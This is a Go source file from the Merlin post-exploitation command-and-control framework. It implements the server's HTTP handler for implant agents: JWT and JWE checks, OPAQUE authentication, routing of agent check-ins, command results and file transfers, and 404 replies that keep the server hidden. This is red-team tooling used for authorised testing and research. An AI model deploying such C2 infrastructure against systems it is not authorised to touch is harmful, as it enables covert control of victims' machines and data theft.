// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2020  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package handlers

import (
	// Standard
	"bytes"
	"crypto/sha256"
	"encoding/gob"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"

	// 3rd Party
	uuid "github.com/satori/go.uuid"
	"go.dedis.ch/kyber/v3"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/agents"
	messageAPI "github.com/Ne0nd0g/merlin/pkg/api/messages"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/logging"
	"github.com/Ne0nd0g/merlin/pkg/messages"
	"github.com/Ne0nd0g/merlin/pkg/util"
)

// HTTPContext contains contextual information about a handler such as secrets for encrypt/decrypt
type HTTPContext struct {
	Context
	PSK       string       // The pre-shared key password used prior to Password Authenticated Key Exchange (PAKE)
	JWTKey    []byte       // The password used by the server to create JWTs
	OpaqueKey kyber.Scalar // OPAQUE server's keys
}

// AgentHTTP function is responsible for all Merlin agent traffic
func (ctx *HTTPContext) AgentHTTP(w http.ResponseWriter, r *http.Request) {
	if core.Verbose {
		m := fmt.Sprintf("Received %s %s connection from %s", r.Proto, r.Method, r.RemoteAddr)
		message("warn", m)
		logging.Server(m)
	}

	if core.Debug {
		var m string
		m += "HTTP Connection Details:\r\n"
		m += fmt.Sprintf("Host: %s\r\n", r.Host)
		m += fmt.Sprintf("URI: %s\r\n", r.RequestURI)
		m += fmt.Sprintf("Method: %s\r\n", r.Method)
		m += fmt.Sprintf("Protocol: %s\r\n", r.Proto)
		m += fmt.Sprintf("Headers: %s\r\n", r.Header)
		if r.TLS != nil {
			m += fmt.Sprintf("TLS Negotiated Protocol: %s\r\n", r.TLS.NegotiatedProtocol)
			m += fmt.Sprintf("TLS Cipher Suite: %d\r\n", r.TLS.CipherSuite)
			m += fmt.Sprintf("TLS Server Name: %s\r\n", r.TLS.ServerName)
		}
		m += fmt.Sprintf("Content Length: %d", r.ContentLength)

		message("debug", m)
		logging.Server(m)
	}

	// Check for Merlin PRISM activity
	if r.UserAgent() == "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36 " {
		m := fmt.Sprintf("Someone from %s is attempting to fingerprint this Merlin server", r.RemoteAddr)
		message("warn", m)
		logging.Server(m)
	}

	// Make sure the message has a JWT
	token := r.Header.Get("Authorization")
	if token == "" {
		if core.Verbose {
			m := "incoming request did not contain an Authorization header"
			message("warn", m)
			logging.Server(m)
		}
		w.WriteHeader(404)
		return
	}

	// Make sure the Authorization header contains a bearer token
	if !strings.Contains(token, "Bearer eyJ") {
		if core.Verbose {
			m := "incoming request did not contain a Bearer token"
			message("warn", m)
			logging.Server(m)
		}
		w.WriteHeader(404)
		return
	}

	// Make sure the content type is: application/octet-stream; charset=utf-8
	if r.Header.Get("Content-Type") != "application/octet-stream; charset=utf-8" {
		if core.Verbose {
			m := "incoming request did not contain a Content-Type header of: application/octet-stream; charset=utf-8"
			message("warn", m)
			logging.Server(m)
		}
		w.WriteHeader(404)
		return
	}

	if r.Method == http.MethodPost {

		var returnMessage messages.Base
		var err error
		var key []byte

		//Read the request message until EOF
		requestBytes, errRequestBytes := ioutil.ReadAll(r.Body)
		if errRequestBytes != nil {
			m := fmt.Sprintf("There was an error reading a POST message sent by an "+
				"agent:\r\n%s", errRequestBytes)
			message("warn", m)
			return
		}

		// Decode gob to JWE string
		var jweString string
		errDecode := gob.NewDecoder(bytes.NewReader(requestBytes)).Decode(&jweString)
		if errDecode != nil {
			message("warn", fmt.Sprintf("there was an error decoding JWE payload message sent by an agent:\r\n%s", errDecode.Error()))
			return
		}

		// Validate JWT and get claims
		var agentID uuid.UUID
		var errValidate error

		// Set return headers
		//w.Header().Set("Content-Type", "application/octet-stream")

		// Validate JWT using HTTP interface JWT key; Given to authenticated agents by server
		agentID, errValidate = util.ValidateJWT(strings.Split(token, " ")[1], ctx.JWTKey)
		// If agentID was returned, then message contained a JWT encrypted with the HTTP interface key
		if (errValidate != nil) && (agentID == uuid.Nil) { // Unauthenticated Agents
			if core.Verbose {
				message("warn", errValidate.Error())
				message("note", "trying again with interface PSK")
			}
			// Validate JWT using interface PSK; Used by unauthenticated agents
			hashedKey := sha256.Sum256([]byte(ctx.PSK))
			key = hashedKey[:]
			agentID, errValidate = util.ValidateJWT(strings.Split(token, " ")[1], key)
			if errValidate != nil {
				// Check to see if the request matches traffic that could be an orphaned agent
				// An orphaned agent will have a JWT encrypted with server's JWT key, not the PSK
				if len(token) == 402 && r.ContentLength > 409 {
					m := fmt.Sprintf("Orphaned agent request detected from %s, instructing agent to OPAQUE authenticate", r.RemoteAddr)
					message("note", m)
					logging.Server(m)
					w.WriteHeader(401)
					return
				}
				if core.Verbose {
					message("warn", errValidate.Error())
				}
				w.WriteHeader(404)
				return
			}
			if core.Debug {
				message("info", "Unauthenticated JWT")
			}

			// Decrypt the HTTP payload, a JWE, using interface PSK
			k, errDecryptPSK := util.DecryptJWE(jweString, key)
			// Successfully decrypted JWE with interface PSK
			if errDecryptPSK == nil {
				if core.Debug {
					message("debug", fmt.Sprintf("[DEBUG]POST DATA: %v", k))
				}
				if core.Verbose {
					message("note", fmt.Sprintf("Received %s message, decrypted JWE with interface PSK", k.Type))
				}

				messagePayloadBytes := new(bytes.Buffer)

				// Allowed unauthenticated message types w/ PSK signed JWT and PSK encrypted JWT
				switch k.Type {
				case "AuthInit":
					serverAuthInit, err := agents.OPAQUEAuthenticateInit(k)
					if err != nil {
						logging.Server(err.Error())
						message("warn", err.Error())
						w.WriteHeader(404)
						return
					}
					if serverAuthInit.Type == "ReRegister" {
						m := fmt.Sprintf("Un-Registered agent %s sent OPAQUE authentication, instructing agent to OPAQUE register", agentID)
						message("note", m)
						logging.Server(m)
					} else {
						logging.Server(fmt.Sprintf("Received new agent OPAQUE authentication from %s", agentID))
					}

					// Encode return message into a gob
					errAuthInit := gob.NewEncoder(messagePayloadBytes).Encode(serverAuthInit)
					if errAuthInit != nil {
						m := fmt.Sprintf("there was an error encoding the return message into a gob:\r\n%s", errAuthInit.Error())
						logging.Server(m)
						message("warn", m)
						w.WriteHeader(404)
						return
					}
				case "RegInit":
					serverRegInit, err := agents.OPAQUERegistrationInit(k, ctx.OpaqueKey)
					if err != nil {
						logging.Server(err.Error())
						message("warn", err.Error())
						w.WriteHeader(404)
						return
					}
					logging.Server(fmt.Sprintf("Received new agent OPAQUE user registration initialization from %s", agentID))

					// Encode return message into a gob
					errRegInit := gob.NewEncoder(messagePayloadBytes).Encode(serverRegInit)
					if errRegInit != nil {
						m := fmt.Sprintf("there was an error encoding the return message into a gob:\r\n%s", errRegInit.Error())
						logging.Server(m)
						message("warn", m)
						w.WriteHeader(404)
						return
					}
				case "RegComplete":
					serverRegComplete, err := agents.OPAQUERegistrationComplete(k)
					if err != nil {
						logging.Server(err.Error())
						message("warn", err.Error())
						w.WriteHeader(404)
						return
					}
					logging.Server(fmt.Sprintf("Received new agent OPAQUE user registration complete from %s", agentID))

					// Encode return message into a gob
					errRegInit := gob.NewEncoder(messagePayloadBytes).Encode(serverRegComplete)
					if errRegInit != nil {
						m := fmt.Sprintf("there was an error encoding the return message into a gob:\r\n%s", errRegInit.Error())
						logging.Server(m)
						message("warn", m)
						w.WriteHeader(404)
						return
					}
				default:
					message("warn", fmt.Sprintf("invalid message type: %s for unauthenticated JWT", k.Type))
					w.WriteHeader(404)
					return
				}
				// Get JWE
				jwe, errJWE := core.GetJWESymetric(messagePayloadBytes.Bytes(), key)
				if errJWE != nil {
					logging.Server(errJWE.Error())
					message("warn", errJWE.Error())
					w.WriteHeader(404)
					return
				}

				// Set return headers
				w.Header().Set("Content-Type", "application/octet-stream")

				// Encode JWE into gob
				errJWEBuffer := gob.NewEncoder(w).Encode(jwe)
				if errJWEBuffer != nil {
					m := fmt.Errorf("there was an error writing the %s response message to the HTTP stream:\r\n%s", k.Type, errJWEBuffer.Error())
					logging.Server(m.Error())
					message("warn", m.Error())
					w.WriteHeader(404)
					return
				}

				return
			}
			if core.Verbose {
				message("note", "Unauthenticated JWT w/ Authenticated JWE agent session key")
			}
			// Decrypt the HTTP payload, a JWE, using agent session key
			j, errDecrypt := util.DecryptJWE(jweString, agents.GetEncryptionKey(agentID))
			if errDecrypt != nil {
				message("warn", errDecrypt.Error())
				w.WriteHeader(404)
				return
			}

			if core.Debug {
				message("debug", fmt.Sprintf("[DEBUG]POST DATA: %v", j))
			}
			if core.Verbose {
				message("info", fmt.Sprintf("Received %s message from %s at %s", j.Type, j.ID, time.Now().UTC().Format(time.RFC3339)))
			}

			// Allowed authenticated message with PSK JWT and JWE encrypted with derived secret
			switch j.Type {
			case "AuthComplete":
				returnMessage, err = agents.OPAQUEAuthenticateComplete(j)
				if err != nil {
					logging.Server(fmt.Sprintf("Received new agent OPAQUE authentication from %s", agentID))
				}
				m := fmt.Sprintf("New authenticated agent checkin for %s from %s at %s", j.ID.String(), r.RemoteAddr, time.Now().UTC().Format(time.RFC3339))
				message("success", m)
				logging.Server(m)
			default:
				message("warn", fmt.Sprintf("Invalid Activity: %s", j.Type))
				w.WriteHeader(404)
				return
			}
		} else { // Authenticated Agents
			// If not using the PSK, the agent has previously authenticated
			if core.Debug {
				message("info", "Authenticated JWT")
			}

			// Decrypt JWE
			key = agents.GetEncryptionKey(agentID)

			j, errDecrypt := util.DecryptJWE(jweString, key)
			if errDecrypt != nil {
				message("warn", errDecrypt.Error())
				w.WriteHeader(404)
				return
			}

			if core.Debug {
				message("debug", fmt.Sprintf("[DEBUG]POST DATA: %v", j))
			}
			if core.Verbose {
				message("note", "Authenticated JWT w/ Authenticated JWE agent session key")
				message("info", fmt.Sprintf("Received %s message from %s at %s", j.Type, j.ID, time.Now().UTC().Format(time.RFC3339)))
			}

			// If both an agentID and error were returned, then the claims were likely bad and the agent needs to re-authenticate
			if (errValidate != nil) && (agentID != uuid.Nil) {
				message("warn", fmt.Sprintf("Agent %s connected with expired JWT. Instructing agent to re-authenticate", agentID))
				j.Type = "ReAuthenticate"
			}

			// Authenticated and authorized message types
			switch j.Type {
			case "KeyExchange":
				returnMessage, err = agents.KeyExchange(j)
			case "StatusCheckIn":
				returnMessage, err = agents.StatusCheckIn(j)
			case "CmdResults":
				err = agents.JobResults(j)
			case "AgentInfo":
				err = agents.UpdateInfo(j)
			case "FileTransfer":
				err = agents.FileTransfer(j)
			case "ReAuthenticate":
				returnMessage, err = agents.OPAQUEReAuthenticate(agentID)
			default:
				err = fmt.Errorf("invalid message type: %s", j.Type)
			}
		}

		if err != nil {
			m := fmt.Sprintf("There was an error during while handling a message from agent %s:\r\n%s", agentID, err.Error())
			logging.Server(m)
			message("warn", m)
			w.WriteHeader(404)
			return
		}

		if returnMessage.Type == "" {
			returnMessage.Type = "ServerOk"
			returnMessage.ID = agentID
		}
		if core.Verbose {
			message("note", fmt.Sprintf("Sending "+returnMessage.Type+" message type to agent"))
		}

		// Get JWT to add to message.Base for all messages except re-authenticate messages
		if returnMessage.Type != "ReAuthenticate" {
			jsonWebToken, errJWT := util.GetJWT(agentID, ctx.JWTKey)
			if errJWT != nil {
				message("warn", errJWT.Error())
				w.WriteHeader(404)
				return
			}
			returnMessage.Token = jsonWebToken
		}

		// Encode messages.Base into a gob
		returnMessageBytes := new(bytes.Buffer)
		errReturnMessageBytes := gob.NewEncoder(returnMessageBytes).Encode(returnMessage)
		if errReturnMessageBytes != nil {
			m := fmt.Sprintf("there was an error encoding the %s return message for agent %s into a GOB:\r\n%s", returnMessage.Type, agentID, errReturnMessageBytes.Error())
			logging.Server(m)
			message("warn", m)
			return
		}

		// Get JWE
		key = agents.GetEncryptionKey(agentID)
		jwe, errJWE := core.GetJWESymetric(returnMessageBytes.Bytes(), key)
		if errJWE != nil {
			logging.Server(errJWE.Error())
			message("warn", errJWE.Error())
		}

		// Set return headers
		w.Header().Set("Content-Type", "application/octet-stream")

		// Encode JWE to GOB and send it to the agent
		errEncode := gob.NewEncoder(w).Encode(jwe)
		if errEncode != nil {
			m := fmt.Sprintf("There was an error encoding the server AuthComplete GOB message:\r\n%s", errEncode.Error())
			logging.Server(m)
			message("warn", m)
			return
		}

		// Remove the agent from the server after successfully sending the kill message
		if returnMessage.Type == "AgentControl" {
			if returnMessage.Payload.(messages.AgentControl).Command == "kill" {
				err := agents.RemoveAgent(agentID)
				if err != nil {
					message("warn", err.Error())
					return
				}
				message("info", fmt.Sprintf("Agent %s was removed from the server", agentID))
				return
			}
		}

	} else if r.Method == "GET" {
		w.WriteHeader(404)
	} else {
		w.WriteHeader(404)
	}
	if core.Debug {
		message("debug", "Leaving http2.agentHandler function without error")
	}
}

// message is used to send a broadcast message to all connected clients
func message(level string, message string) {
	m := messageAPI.UserMessage{
		Message: message,
		Time:    time.Now().UTC(),
		Error:   false,
	}
	switch level {
	case "info":
		m.Level = messageAPI.Info
	case "note":
		m.Level = messageAPI.Note
	case "warn":
		m.Level = messageAPI.Warn
	case "debug":
		m.Level = messageAPI.Debug
	case "success":
		m.Level = messageAPI.Success
	default:
		m.Level = messageAPI.Plain
	}
	messageAPI.SendBroadcastMessage(m)
}
